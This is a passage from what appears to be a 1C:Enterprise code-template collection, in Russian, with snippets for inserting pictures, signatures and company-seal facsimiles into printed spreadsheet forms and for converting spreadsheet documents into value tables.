ОбластьКартинки = Макет.ПолучитьОбласть(""ОбластьСКартинкой""); 
Картинка = Новый Картинка(ПутьККартинке); 

// Элемент управления ""Логотип"" входит в коллекцию картинок области. 
ОбластьКартинки.Рисунки.Логотип.Картинка = Картинка; 
ТабДок.Вывести(ОбластьКартинки); 

ТабДок.Показать(); 

// 2-й вариант
//Как вывести картинку в табличный документ без изменения макета?

Область = Макет.ПолучитьОбласть(""Шапка""); 
Рисунок = Область.Рисунки.Добавить(ТипРисункаТабличногоДокумента.Картинка); 
Рисунок.Верх = 5; 
Рисунок.Высота = 10; 
Рисунок.Ширина = 10; 
Рисунок.Лево = 5; 
Рисунок.Картинка = Новый Картинка(ПутьККартинке); 
Рисунок.РазмерКартинки = РазмерКартинки.РеальныйРазмер; 

ТабДок.Вывести(Область); 

//3-й вариант
//ПечатьОрганизации , добавляем в макет картинку с именем Картинка1 в самую нижнюю
//область с именем ОбластьПечатьОрганизации
ОбластьПечатьОрганизации = Макет.ПолучитьОбласть(""ПечатьОрганизации"");
Картинка= Новый Картинка(""C:\files\img\печатьОрганизации.gif"") ;
ОбластьПечатьОрганизации.Рисунки.Картинка1.Картинка = картинка;
ТабДок.Вывести(ОбластьПечатьОрганизации);

// 4-й вариант динамически
ОбластьПечатьОрганизации = Макет.ПолучитьОбласть(""ПечатьОрганизации"");
КартинкаПечатьОрганизации = ОбластьПечатьОрганизации.Рисунки.Добавить(ТипРисункаТабличногоДокумента.Картинка);
КартинкаПечатьОрганизации.Картинка = БиблиотекаКартинок.ОбщаяКартинка1;
КартинкаПечатьОрганизации.Верх = 0;
КартинкаПечатьОрганизации.Высота = 80;
КартинкаПечатьОрганизации.Ширина = 80;
КартинкаПечатьОрганизации.Лево = 50;
КартинкаПечатьОрганизации.ГраницаСверху = Ложь;
КартинкаПечатьОрганизации.ГраницаСлева = Ложь;
КартинкаПечатьОрганизации.ГраницаСправа = Ложь;
КартинкаПечатьОрганизации.ГраницаСнизу = Ложь;
КартинкаПечатьОрганизации.РазмерКартинки = РазмерКартинки.АвтоРазмер;
ТабДок.Вывести(ОбластьПечатьОрганизации);

//5-й вариант получение картинки из хранилища значений
// Выборка.Изображение - выборка из запроса, Изображение реквизит -хранил. значений  
Попытка
    Путь = КаталогВременныхФайлов()+ ""\1С_Картинка_""+Формат(ТекущаяДата(),""ДФ=yyyyMMddЧЧммсс"")+"".bmp"";
    КартинкаВПамяти = Выборка.Изображение.Получить();
    КартинкаВПамяти.Записать(Путь);
    ОбластьСостав.Рисунки.D1.Картинка = Новый Картинка(Путь);
Исключение
    ОбластьСостав.Рисунки.D1.Картинка = Новый Картинка;
КонецПопытки;"}
},
{0,
{"ДобавитьРисунок (изображение, картинку, факсимиле)",0,0,"","Функция ДобавитьРисунок(пТабличныйДокумент, пИмяОбласти, пКартинка, пЛево, пВерх, пВысота, пШирина)
	
	лРезультат = Неопределено;
	
	Область 	= пТабличныйДокумент.Области[пИмяОбласти]; 
	Рисунок 	= пТабличныйДокумент.Рисунки.Добавить(ТипРисункаТабличногоДокумента.Картинка);
	Рисунок.Картинка = пКартинка;
	Рисунок.Линия 	= Новый Линия(ТипЛинииРисункаТабличногоДокумента.НетЛинии); //Содержит тип линии рисунка
	Рисунок.Узор 	= ТипУзораТабличногоДокумента.БезУзора;
	Рисунок.Верх 	= пВерх; //Содержит положение верхней границы рисунка, отсчитываемое от верхней стороны табличного документа (в миллиметрах)
	Рисунок.Лево 	= пЛево; //Содержит положение левой границы рисунка, отсчитываемое от левой стороны табличного документа (в миллиметрах)
	Рисунок.Высота 	= пВысота; //Содержит высоту рисунка (в миллиметрах)
	Рисунок.Ширина 	= пШирина; //Содержит ширину рисунка (в миллиметрах).
	Рисунок.РазмерКартинки = РазмерКартинки.Пропорционально;
	
	Рисунок.Расположить(Область); //Если область по имени задана, то будут координаты и размер КАРТИНКИ, иначе впишет в область независимо от размера картинки
		
	Возврат лРезультат;
	
КонецФункции // ДобавитьРисунок()"}
},
{0,
{"ДобавитьРисунок в Область (изображение, картинку, факсимиле)",0,0,"","Функция ДобавитьРисунокВОбласть(пТабличныйДокумент, пОбласть, пКартинка, пЛево, пВерх, пВысота, пШирина)
	
	лРезультат = Неопределено;
	
	Область 	= пОбласть; 
	Рисунок 	= пТабличныйДокумент.Рисунки.Добавить(ТипРисункаТабличногоДокумента.Картинка);
	Рисунок.Картинка = пКартинка;
	Рисунок.Линия 	= Новый Линия(ТипЛинииРисункаТабличногоДокумента.НетЛинии); //Содержит тип линии рисунка
	Рисунок.Узор 	= ТипУзораТабличногоДокумента.БезУзора;
	Рисунок.Верх 	= пВерх; //Содержит положение верхней границы рисунка, отсчитываемое от верхней стороны табличного документа (в миллиметрах)
	Рисунок.Лево 	= пЛево; //Содержит положение левой границы рисунка, отсчитываемое от левой стороны табличного документа (в миллиметрах)
	Рисунок.Высота 	= пВысота; //Содержит высоту рисунка (в миллиметрах)
	Рисунок.Ширина 	= пШирина; //Содержит ширину рисунка (в миллиметрах).
	Рисунок.РазмерКартинки = РазмерКартинки.Пропорционально;
	
	Рисунок.Расположить(Область); //Если область по имени задана, то будут координаты и размер КАРТИНКИ, иначе впишет в область независимо от размера картинки
		
	Возврат лРезультат;
	
КонецФункции // ДобавитьРисунок()"}
},
{0,
{"Подпись в табличном дакументе печатной формы",0,0,"ТабДокПодпись","ОбластьПодпись<?""ВладелецПодписи""> 	= <?""Область"">.Рисунки.Добавить(ТипРисункаТабличногоДокумента.Картинка);
ОбластьПодпись<?""ВладелецПодписи"">.Картинка 	= БиблиотекаКартинок.<?""НазваниеИзображенияПодписи"">;
ОбластьПодпись<?""ВладелецПодписи"">.Линия 	= Новый Линия(ТипЛинииРисункаТабличногоДокумента.НетЛинии); //Содержит тип линии рисунка
ОбластьПодпись<?""ВладелецПодписи"">.Узор 	= ТипУзораТабличногоДокумента.БезУзора;
ОбластьПодпись<?""ВладелецПодписи"">.Верх 	= 0; //Содержит положение верхней границы рисунка, отсчитываемое от верхней стороны табличного документа (в миллиметрах)
ОбластьПодпись<?""ВладелецПодписи"">.Лево 	= 0; //Содержит положение левой границы рисунка, отсчитываемое от левой стороны табличного документа (в миллиметрах)
ОбластьПодпись<?""ВладелецПодписи"">.Высота 	= 20; //Содержит высоту рисунка (в миллиметрах)
ОбластьПодпись<?""ВладелецПодписи"">.Ширина 	= 40; //Содержит ширину рисунка (в миллиметрах).
ОбластьПодпись<?""ВладелецПодписи"">.РазмерКартинки 	= РазмерКартинки.АвтоРазмер;
"}
},
{0,
{"Доработка печатных форм (вывод реквизита в макет)",0,0,"","// <?""Выборка запроса для обхода""> - запрос с данными для вывода в ПФ
ТоварыВыгрузкаИзВыборки = <?""Выборка запроса для обхода"">.ВыгрузитьКолонку(""Номенклатура"");
Таблица<?""Таблица чего (напр, штрихкод, параметр)""> = ПолучитьТаблицу<?""Таблица чего (напр, штрихкод, параметр)"">(ТоварыВыгрузкаИзВыборки); // Функция получения новых своих данных для добавления

<?""Выборка запроса для обхода"">.Колонки.Добавить(""<?""Таблица чего (напр, штрихкод, параметр)"">"");

Если Таблица<?""Таблица чего (напр, штрихкод, параметр)""> <> Неопределено Тогда
	Для Каждого <?""Элемент выборки для обхода (Напр, СтрокаТовара)""> Из <?""Выборка запроса для обхода (Напр, ЗапросТовары)""> Цикл
		ПараметрыОтбора = Новый Структура;
		ПараметрыОтбора.Вставить(""Номенклатура"", <?""Элемент выборки для обхода (Напр, СтрокаТовара)"">.Товар);
		ПараметрыОтбора.Вставить(""ЕдиницаИзмеренияНаименование"", <?""Элемент выборки для обхода (Напр, СтрокаТовара)"">.ЕдиницаИзмерения); // <?""Элемент выборки для обхода (Напр, СтрокаТовара)"">.ЕдиницаИзмерения строкой
		
		НайденныеСтроки = Таблица<?""Таблица чего (напр, штрихкод, параметр)"">.НайтиСтроки(ПараметрыОтбора);
		
		РезделительЭлементов = "", "";
		РезделительДлина = СтрДлина(РезделительЭлементов);
		Если ЗначениеЗаполнено(НайденныеСтроки) Тогда
			<?""Таблица чего (напр, штрихкод, параметр)"">Строка = """";
			
			Для каждого ЭлМассив Из НайденныеСтроки Цикл
				<?""Таблица чего (напр, штрихкод, параметр)"">Строка = <?""Таблица чего (напр, штрихкод, параметр)"">Строка + СокрЛП(ЭлМассив.<?""Таблица чего (напр, штрихкод, параметр)"">) + РезделительЭлементов;
			КонецЦикла;
			
			<?""Таблица чего (напр, штрихкод, параметр)"">Строка = Сред(<?""Таблица чего (напр, штрихкод, параметр)"">Строка, 1, СтрДлина(<?""Таблица чего (напр, штрихкод, параметр)"">Строка) - РезделительДлина); // Убираем последний разделитель
			
			<?""Элемент выборки для обхода (Напр, СтрокаТовара)"">.<?""Таблица чего (напр, штрихкод, параметр)""> = <?""Таблица чего (напр, штрихкод, параметр)"">Строка;
			
		КонецЕсли;
	КонецЦикла;
КонецЕсли;

// Далее в цикле построчной обработки товаров
Если Таблица<?""Таблица чего (напр, штрихкод, параметр)""> <> Неопределено Тогда
	ОбластьМакета.Параметры.<?""Таблица чего (напр, штрихкод, параметр)""> = Строчка.<?""Таблица чего (напр, штрихкод, параметр)"">;
КонецЕсли;

Функция ПолучитьТаблицу<?""Таблица чего (напр, штрихкод, параметр)"">(СписокНоменклатуры)
	
	Запрос = Новый Запрос;
	Запрос.Текст = 
	""ВЫБРАТЬ
	|	ШтрихкодыНоменклатуры.Штрихкод КАК Штрихкод,
	|	ШтрихкодыНоменклатуры.ЕдиницаИзмерения КАК ЕдиницаИзмерения,
	|	ШтрихкодыНоменклатуры.Номенклатура
	|ИЗ
	|	РегистрСведений.ШтрихкодыНоменклатуры КАК ШтрихкодыНоменклатуры
	|ГДЕ
	|	ШтрихкодыНоменклатуры.Номенклатура В (&Номенклатура)"";
	
	Запрос.УстановитьПараметр(""Номенклатура"", СписокНоменклатуры); // В запросе важно наличие ""ГДЕ Элемент В (&Номенклатура)""
	
	РезультатЗапроса = Запрос.Выполнить();
	
	ВыборкаДетальныеЗаписи = РезультатЗапроса.Выбрать();
	
	Если НЕ РезультатЗапроса.Пустой() Тогда
		Возврат РезультатЗапроса.Выгрузить();
	КонецЕсли; 
	
КонецФункции
"}
},
{0,
{"ОбластьМакета.Параметры.Заполнить",0,0,"","ОбластьМакета = Макет.ПолучитьОбласть(""Шапка"");

лДанныеЗаполнения = Новый Структура();
лДанныеЗаполнения.Вставить("""", );

ОбластьМакета.Параметры.Заполнить(лДанныеЗаполнения);

ТабличныйДокумент.Вывести(ОбластьМакета);"}
},
{0,
{"АдресОбластьМакета (для вывода картинки в область, но в целом для многого)",0,0,"","//Функция АдресОбластьМакета
//-------------------------------------------------------------------------
//Параметры:
//		пТабличныйДокумент 	- ТабДок 	- описание
//		пОбласть 	- Область 	- Область из которой блать значения номера строки, колонки. Относительно которой получать область. Типа точка отсчёта
//		пСтрокаБазовая 	- Число 	- Число смещения области относительно строки пОбласть 
//		пКолонкаБазовая 	- Число 	- Число смещения области относительно колонки пОбласть
//		пСтрокаСтрого 	- Число 	- Если не ноль, то будет присвоено строго это значение. Для задания масштаба высоты
//		пКолонкаСтрого 	- Число 	- Если не ноль, то будет присвоено строго это значение. Для задания масштаба ширины
//Возвращаемое значение:
//		Область 	- Область для вставки картинки относительно заданной области
//-------------------------------------------------------------------------
//Фигня в том, что если выводить картинку (через Рисунок.Расположить(Область)) 
//в просто область, полученную через 
//ОбластьПодвалСчета 	= ТабличныйДокумент.Области[""ПодвалСчета""];
//То будет выведено по значениям свойств КАРТИНКИ Лево и Право.
//Но если передать область полученную через, то подцепит место области, но кривовато
//ОбластьПодвалСчета 	= ТабличныйДокумент.Область(ЛСтрока, ЛКолонка, ПСтрока, ПКолонка);
//Аккуратно надо с пСтрокаСтрого, пКолонкаСтрого. Т.к. они привязаны к колонкам,
//и если кто-то добавит новую, то всё может ощутимо сместиться/измениться.
//В целом все значения подбираются эмпирически на относительных значениях 
//расположения области через пОбласть.Верх, пОбласть.Низ
//-------------------------------------------------------------------------
//автор: КучеровРМ 11.01.2019
Функция АдресОбластьМакета(пТабличныйДокумент, пОбласть, пСтрокаБазовая = 0, пКолонкаБазовая = 0, пСтрокаСтрого = 0, пКолонкаСтрого = 0)
	
	ОбластьКоордПрям = """";
	
	ЛСтрока 	= пОбласть.Верх + 1 + пСтрокаБазовая;
	ЛКолонка 	= пОбласть.Лево + 1 + пКолонкаБазовая;
	
	Если ЗначениеЗаполнено(пСтрокаСтрого) Тогда
		ПСтрока 	= пСтрокаСтрого;
	Иначе
		ПСтрока 	= пОбласть.Низ + 1 + пСтрокаБазовая;
	КонецЕсли; 
	
	Если ЗначениеЗаполнено(пКолонкаСтрого) Тогда
		ПКолонка 	= пКолонкаСтрого;
	Иначе
		Высота 		= ПСтрока - ЛСтрока;
		ПКолонка 	= Высота + пКолонкаБазовая;
	КонецЕсли;
	
	ОбластьКоордПрям 	= пТабличныйДокумент.Область(ЛСтрока, ЛКолонка, ПСтрока, ПКолонка);
	
	Возврат ОбластьКоордПрям;
	
КонецФункции // АдресОбластьМакета()"}
},
{0,
{"АвтоМасштаб",0,0,"","ТабличныйДокумент.АвтоМасштаб = Истина; //Если не помещается на лист, то будет подогнан"}
},
{0,
{"Добавить картинку/факсимиле универсально",0,0,"","//+++ АйТи Кучеров Р.М. 11.01.2019 ТЗ № ИС00-008594 >> e1cib/data/Документ.ЗаданиеНаРаботу?ref=b78532336337376211e9090986673c87

Функция ВывестиФаксимиле(пТабличныйДокумент, пЗаказКлиента, пОбластьДляВывода = Неопределено, пИмяОбластиДляВывода = ""Подвал"")
	
	лРезультат = Ложь;
	
	Организация   = пЗаказКлиента.Организация;
	
	ФайлКартинки = Неопределено;
	Запрос = Новый Запрос;
	Запрос.Текст =
	""ВЫБРАТЬ РАЗРЕШЕННЫЕ ПЕРВЫЕ 2
	|	ОрганизацииПрисоединенныеФайлы.Ссылка КАК ФайлКартинки
	|ИЗ
	|	Справочник.ОрганизацииПрисоединенныеФайлы КАК ОрганизацииПрисоединенныеФайлы
	|ГДЕ
	|	ОрганизацииПрисоединенныеФайлы.ВладелецФайла = &Организация
	|	И (ОрганизацииПрисоединенныеФайлы.Наименование = """"Динамика_Подпись""""
	|			ИЛИ ОрганизацииПрисоединенныеФайлы.Наименование = """"Динамика_Печать"""")"";
	
	Запрос.УстановитьПараметр(""Организация"",Организация);
	Выборка = Запрос.Выполнить().Выбрать();
	
	Пока Выборка.Следующий() Цикл
		ВыборкаФайлКартинки = Выборка.ФайлКартинки;
		Если ВыборкаФайлКартинки.Наименование = ""Динамика_Подпись"" Тогда
			ФайлКартинкиПодпись = Выборка.ФайлКартинки;
		ИначеЕсли ВыборкаФайлКартинки.Наименование = ""Динамика_Печать"" Тогда
			ФайлКартинкиПечать = Выборка.ФайлКартинки;
		КонецЕсли; 
	КонецЦикла;
	
	Если пОбластьДляВывода = Неопределено И НЕ ПустаяСтрока(пИмяОбластиДляВывода) Тогда
		пОбластьДляВывода 	= пТабличныйДокумент.Области[пИмяОбластиДляВывода];	
	КонецЕсли; 
	
	//ФайлКартинкиПодпись
	Если ЗначениеЗаполнено(ФайлКартинкиПодпись) Тогда
		Картинка = ПолучитьКартинку(РаботаСФайлами.ДвоичныеДанныеФайла(ФайлКартинкиПодпись));
		
		Если ЗначениеЗаполнено(Картинка) Тогда
			РисунокРазмер = 40; //Но при выводе в область это не повлияет
			ОбластьКоордПрям = АдресОбластьМакета(пТабличныйДокумент, пОбластьДляВывода, -3, 10,, 15);
			ДобавитьРисунокВОбласть(пТабличныйДокумент, ОбластьКоордПрям, Картинка, 100, 2, РисунокРазмер, РисунокРазмер);
		КонецЕсли;
		лРезультат = Истина;
	КонецЕсли;
	
	//ФайлКартинкиПечать
	Если ЗначениеЗаполнено(ФайлКартинкиПечать) Тогда
		Картинка = ПолучитьКартинку(РаботаСФайлами.ДвоичныеДанныеФайла(ФайлКартинкиПечать));
		
		Если ЗначениеЗаполнено(Картинка) Тогда
			РисунокРазмер = 40; //Но при выводе в область это не повлияет
			ОбластьКоордПрям = АдресОбластьМакета(пТабличныйДокумент, пОбластьДляВывода, 0, 17,, 24);
			ДобавитьРисунокВОбласть(пТабличныйДокумент, ОбластьКоордПрям, Картинка, 100, 2, РисунокРазмер, РисунокРазмер);
		КонецЕсли;
		лРезультат = Истина;
	КонецЕсли;
	
	Возврат лРезультат;
	
КонецФункции // ВывестиФаксимиле()

Функция ПолучитьКартинку(ДвоичныеДанныеФайла)
	
	лРезультат = Неопределено;
	
	Если ТипЗнч(ДвоичныеДанныеФайла) = Тип(""Картинка"") Тогда
		Картинка = ДвоичныеДанныеФайла;
	ИначеЕсли ТипЗнч(ДвоичныеДанныеФайла) = Тип(""ДвоичныеДанные"") Тогда
		Картинка = Новый Картинка(ДвоичныеДанныеФайла);
	Иначе
		Картинка = Новый Картинка;
	КонецЕсли;
	
	лРезультат = Картинка;
	
	Возврат лРезультат;
	
КонецФункции // ПолучитьКартинку()

//Функция АдресОбластьМакета
//-------------------------------------------------------------------------
//Параметры:
//		пТабличныйДокумент 	- ТабДок 	- описание
//		пОбласть 	- Область 	- Область из которой блать значения номера строки, колонки. Относительно которой получать область. Типа точка отсчёта
//		пСтрокаБазовая 	- Число 	- Число смещения области относительно строки пОбласть 
//		пКолонкаБазовая 	- Число 	- Число смещения области относительно колонки пОбласть
//		пСтрокаСтрого 	- Число 	- Если не ноль, то будет присвоено строго это значение. Для задания масштаба высоты
//		пКолонкаСтрого 	- Число 	- Если не ноль, то будет присвоено строго это значение. Для задания масштаба ширины
//Возвращаемое значение:
//		Область 	- Область относительно заданной области
//-------------------------------------------------------------------------
//Фигня в том, что если выводить картинку (через Рисунок.Расположить(Область)) 
//в просто область, полученную через 
//ОбластьПодвалСчета 	= ТабличныйДокумент.Области[""ПодвалСчета""];
//То будет выведено по значениям свойств КАРТИНКИ Лево и Право.
//Но если передать область полученную через, то подцепит место области, но кривовато
//ОбластьПодвалСчета 	= ТабличныйДокумент.Область(ЛСтрока, ЛКолонка, ПСтрока, ПКолонка);
//-------------------------------------------------------------------------
//автор: КучеровРМ 11.01.2019 
Функция АдресОбластьМакета(пТабличныйДокумент, пОбласть, пСтрокаБазовая = 0, пКолонкаБазовая = 0, пСтрокаСтрого = 0, пКолонкаСтрого = 0)
	
	ОбластьКоордПрям = """";
	
	ЛСтрока 	= пОбласть.Верх + 1 + пСтрокаБазовая;
	ЛКолонка 	= пОбласть.Лево + 1 + пКолонкаБазовая;
	
	Если ЗначениеЗаполнено(пСтрокаСтрого) Тогда
		ПСтрока 	= пСтрокаСтрого;
	Иначе
		ПСтрока 	= пОбласть.Низ + 1 + пСтрокаБазовая;
	КонецЕсли; 
	
	Если ЗначениеЗаполнено(пКолонкаСтрого) Тогда
		ПКолонка 	= пКолонкаСтрого;
	Иначе
		Высота 		= ПСтрока - ЛСтрока;
		ПКолонка 	= Высота + пКолонкаБазовая;
	КонецЕсли;
	
	ОбластьКоордПрям 	= пТабличныйДокумент.Область(ЛСтрока, ЛКолонка, ПСтрока, ПКолонка);
	
	Возврат ОбластьКоордПрям;
	
КонецФункции // АдресОбластьМакета()

Функция ДобавитьРисунокВОбласть(пТабличныйДокумент, пОбласть, пКартинка, пЛево = 0, пВерх = 0, пВысота = 0, пШирина = 0, РасположитьРисунок = Ложь)
	
	лРезультат = Неопределено;
	
	Область 	= пОбласть; 
	Рисунок 	= пТабличныйДокумент.Рисунки.Добавить(ТипРисункаТабличногоДокумента.Картинка);
	Рисунок.Картинка = пКартинка;
	Рисунок.Линия 	= Новый Линия(ТипЛинииРисункаТабличногоДокумента.НетЛинии); //Содержит тип линии рисунка
	Рисунок.Узор 	= ТипУзораТабличногоДокумента.БезУзора;
	Рисунок.Верх 	= пВерх; //Содержит положение верхней границы рисунка, отсчитываемое от верхней стороны табличного документа (в миллиметрах)
	Рисунок.Лево 	= пЛево; //Содержит положение левой границы рисунка, отсчитываемое от левой стороны табличного документа (в миллиметрах)
	Рисунок.Высота 	= пВысота; //Содержит высоту рисунка (в миллиметрах)
	Рисунок.Ширина 	= пШирина; //Содержит ширину рисунка (в миллиметрах).
	Рисунок.РазмерКартинки = РазмерКартинки.Пропорционально;
	
	Если РасположитьРисунок Тогда
		Рисунок.Расположить(Область);	
	КонецЕсли; 
		
	Возврат лРезультат;
	
КонецФункции // ДобавитьРисунокВОбласть()
 
//--- АйТи Кучеров Р.М. 11.01.2019 ТЗ № ИС00-008594 ч.2 >> e1cib/data/Документ.ЗаданиеНаРаботу?ref=b78532336337376211e9090986673c87
"}
},
{0,
{"Добавить Картинку",0,0,"","//+++ АйТи Кучеров Р.М. 15.01.2019 ТЗ № ИС00-008594 >> e1cib/data/Документ.ЗаданиеНаРаботу?ref=b78532336337376211e9090986673c87
//Было:ФормированиеПечатныхФорм.ВывестиФаксимилеВТабличныйДокумент(Макет, Область, ДанныеПечати.Организация, ПараметрыПечати);
ОтображатьФаксимиле = Ложь;
Если ПараметрыПечати <> Неопределено И ПараметрыПечати.Свойство(""ОтображатьФаксимиле"") Тогда
	ОтображатьФаксимиле = ПараметрыПечати.ОтображатьФаксимиле;
КонецЕсли;

Если ОтображатьФаксимиле Тогда
	//Макет из этой внешней обработки
	МакетОбработки 	= ПолучитьМакет(""ПФ_MXL_СчетНаОплату""); 
	Область 		= МакетОбработки.ПолучитьОбласть(""ПодвалСчета"");
Иначе
	Область 		= Макет.ПолучитьОбласть(""ПодвалСчета"");
КонецЕсли;

Если ОтображатьФаксимиле Тогда
	ФайлКартинки = Неопределено;
	Запрос = Новый Запрос;
	Запрос.Текст =
	""ВЫБРАТЬ РАЗРЕШЕННЫЕ ПЕРВЫЕ 2
	|	ОрганизацииПрисоединенныеФайлы.Ссылка КАК ФайлКартинки
	|ИЗ
	|	Справочник.ОрганизацииПрисоединенныеФайлы КАК ОрганизацииПрисоединенныеФайлы
	|ГДЕ
	|	ОрганизацииПрисоединенныеФайлы.ВладелецФайла = &Организация
	|	И (ОрганизацииПрисоединенныеФайлы.Наименование = """"Динамика_Подпись""""
	|			ИЛИ ОрганизацииПрисоединенныеФайлы.Наименование = """"Динамика_Печать"""")"";
	
	Запрос.УстановитьПараметр(""Организация"", ДанныеПечати.Организация);
	Выборка = Запрос.Выполнить().Выбрать();
	
	Пока Выборка.Следующий() Цикл
		ВыборкаФайлКартинки = Выборка.ФайлКартинки;
		Если ВыборкаФайлКартинки.Наименование = ""Динамика_Подпись"" Тогда
			ФайлКартинкиПодпись = Выборка.ФайлКартинки;
		ИначеЕсли ВыборкаФайлКартинки.Наименование = ""Динамика_Печать"" Тогда
			ФайлКартинкиПечать = Выборка.ФайлКартинки;
		КонецЕсли; 
	КонецЦикла;
	
	//ФайлКартинкиПодпись
	Если ЗначениеЗаполнено(ФайлКартинкиПодпись) Тогда
		Картинка = ПолучитьКартинку(РаботаСФайлами.ДвоичныеДанныеФайла(ФайлКартинкиПодпись));
		
		Если ЗначениеЗаполнено(Картинка) Тогда
			Область.Рисунки.РуководительПодпись.Картинка = Картинка;
		КонецЕсли;
	КонецЕсли;
	
	//ФайлКартинкиПечать
	Если ЗначениеЗаполнено(ФайлКартинкиПечать) Тогда
		Картинка = ПолучитьКартинку(РаботаСФайлами.ДвоичныеДанныеФайла(ФайлКартинкиПечать));
		
		Если ЗначениеЗаполнено(Картинка) Тогда
			Область.Рисунки.Печать.Картинка = Картинка;
		КонецЕсли;
	КонецЕсли;
КонецЕсли;
// Вывести подписи
//Область = Макет.ПолучитьОбласть(""ПодвалСчета"");
//--- АйТи Кучеров Р.М. 15.01.2019 ТЗ № ИС00-008594 >> e1cib/data/Документ.ЗаданиеНаРаботу?ref=b78532336337376211e9090986673c87
"}
},
{5,
{"Табличный документ в Таблицу значений",1,0,"",""},
{0,
{"ТД в ТЗ (построчно)",0,0,"","// Вариант 1
// По переданному табличному документу возвращает таблицу значений, 
// при условии что в первой строке таблицы - идентификаторы колонок 
// Автор : dimoff
Функция ПолучитьТЗИзМакета(ТабДок, КолонкаИндекса = 1) Экспорт
	
	ТаблицаДанных = Новый ТаблицаЗначений;
	НомерКолонки = 0;
	Пока Истина Цикл
		НомерКолонки = НомерКолонки + 1;
		ИмяКолонки = ТабДок.Область(1, НомерКолонки).Текст;
		Если ПустаяСтрока(ИмяКолонки) Тогда
			Прервать;
		КонецЕсли;        
		ТаблицаДанных.Колонки.Добавить(ИмяКолонки);
	КонецЦикла;
	
	СчетчикКолонок = НомерКолонки - 1;
	
	НомерСтроки = 1; ФлагПрерывания = Ложь;
	Пока Истина Цикл
		НомерСтроки = НомерСтроки + 1;
		Стр = ТаблицаДанных.Добавить();
		
		Для А = 1 ПО СчетчикКолонок Цикл
			ТекстКолонки = ТабДок.Область(НомерСтроки, А).Текст;
			Если ПустаяСтрока(ТекстКолонки) Тогда
				Если А = КолонкаИндекса Тогда
					Флагпрерывания = Истина;
					ТаблицаДанных.Удалить(Стр);
				КонецЕсли;
			Иначе
				Стр[А - 1] = ТекстКолонки
			КонецЕсли;
			
			Если Флагпрерывания Тогда
				Прервать
			КонецЕсли;
		КонецЦикла;
		
		Если Флагпрерывания Тогда
			Прервать
		КонецЕсли;
	КонецЦикла;
	
	Возврат ТаблицаДанных
КонецФункции

// Варинат 2
//Функция загружает весь макет, табличный документ в таблицу значений
//Первая строка содержит подписи колонок (должны быть правильные идентификаторы)
//Пустые строки (состоящией из пробелов, переводов строки и т.п.) заменяет на Неопределено
//Если в ячейке есть значение, в ячейку таблицы значений попадает именно это значение
//Автор : Гений1С
Функция обМакетВТаблицуЗначений(Макет) Экспорт
	Перем ТЗ;
	ТЗ=Новый ТаблицаЗначений();
	#Если Клиент Тогда
		//Считываем колонки
		Для Стр=1 По Макет.ВысотаТаблицы Цикл
			Если Стр>1 Тогда
				ТекСтр=ТЗ.Добавить();
			КонецЕсли;
			ПустаяСтрока=истина;
			Для Кол=1 По Макет.ШиринаТаблицы Цикл
				Яч=Макет.Область(Стр, Кол);
				Если Яч.СодержитЗначение Тогда
					Зн=Яч.Значение;
				Иначе
					Зн=Яч.Текст;
				КонецЕсли;
				Если ТипЗнч(Зн)=Тип(""Строка"") И ПустаяСтрока(Зн) Тогда
					Зн=Неопределено;
				КонецЕсли;
				
				//Добавляем колонку
				Если Стр=1 Тогда
					ТЗ.Колонки.Добавить(Зн);
				Иначе
					ТекСтр[Кол-1]=Зн;
				КонецЕсли;
			КонецЦикла;
		КонецЦикла;
	#КонецЕсли
	Возврат ТЗ;
КонецФункции    "}
},
{0,
{"ТД в ТЗ 2 (построчно)",0,0,"","// Преобразует табличный документ в таблицу значений
// Первый ряд - имена колонок
// Все колонки с типом ""Строка""
Функция ТабДокВТаблицуЗначений(ТабДок) Экспорт
	ТЧ = Новый ТаблицаЗначений;
	
	ТекущийРяд = 1;
	ТекущаяКолонка = 1;
	
	СписокКолонок = Новый СписокЗначений;
	Область = ТабДок.ПолучитьОбласть(""R"" + ТекущийРяд);
	Пока Истина Цикл
		ИмяКолонки = Область.Область(""R1C"" + ТекущаяКолонка).Текст;
		ИмяКолонкиМетаданных = ПолучитьДопустимоеИмяДляМетаданных(ИмяКолонки);
		Если НЕ ПустаяСтрока(ИмяКолонки) Тогда
			СписокКолонок.Добавить(ИмяКолонкиМетаданных, ИмяКолонки);
		Иначе
			Прервать;
		КонецЕсли;
		ТекущаяКолонка = ТекущаяКолонка + 1;
	КонецЦикла;
	
	ВсегоКолонок = СписокКолонок.Количество();
	Если ВсегоКолонок = 0 Тогда
		Возврат неопределено;
	КонецЕсли;
	
	КС = Новый КвалификаторыСтроки(50);
	МассивТипов = Новый Массив;
	МассивТипов.Добавить(Тип(""Строка""));
	ОписаниеСтроки = Новый ОписаниеТипов(МассивТипов,,,,КС);
	
	СтруктураСтроки = Новый Структура;
	Для Каждого Колонка ИЗ СписокКолонок Цикл
		ТЧ.Колонки.Добавить(Колонка.Значение, ОписаниеСтроки, Колонка.Представление);
		СтруктураСтроки.Вставить(Колонка.Значение, """");
	КонецЦикла;
	
	// Перебор строк
	
	ЕстьСтрокаСДанными = Истина;
	Пока ЕстьСтрокаСДанными Цикл
		ТекущийРяд = ТекущийРяд + 1;
		Область = ТабДок.ПолучитьОбласть(""R"" + ТекущийРяд);
		
		ПустыхЗначений = 0;
		Для ИНД = 1 ПО ВсегоКолонок Цикл
			ЗначениеКолонки = СокрЛП(Область.Область(""R1C"" + ИНД).Текст);
			Если ПустаяСтрока(ЗначениеКолонки) Тогда
				ПустыхЗначений = ПустыхЗначений + 1;
			КонецЕсли;
			СтруктураСтроки[СписокКолонок[ИНД-1].Значение] = ЗначениеКолонки;
		КонецЦикла;
		Если ПустыхЗначений >= ВсегоКолонок Тогда
			ЕстьСтрокаСДанными = Ложь;
			Прервать;
		КонецЕсли;
		НоваяСтрока = ТЧ.Добавить();
		ЗаполнитьЗначенияСвойств(НоваяСтрока, СтруктураСтроки);
	КонецЦикла;
	Возврат ТЧ;    
КонецФункции

Функция ПолучитьДопустимоеИмяДляМетаданных(СтрокаВхода) Экспорт
	СтрокаВхода = СокрЛП(СтрокаВхода);
	СтрокаВхода = ТРег(СтрокаВхода);
	СтрокаВхода = СтрЗаменить(СтрокаВхода, "" "", """");
	СтрокаВхода = СтрЗаменить(СтрокаВхода, """""""", """");
	НедопустимыеСимволы = "".,/\|!№%;:?*()-=+'`~"";
	Для ИНД = 1 ПО СтрДлина(НедопустимыеСимволы) Цикл
		СимволЗамены = Сред(НедопустимыеСимволы, ИНД, 1);
		СтрокаВхода = СтрЗаменить(СтрокаВхода, СимволЗамены, """");
	КонецЦикла;
	Возврат СтрокаВхода;        
КонецФункции
"}
},
{0,
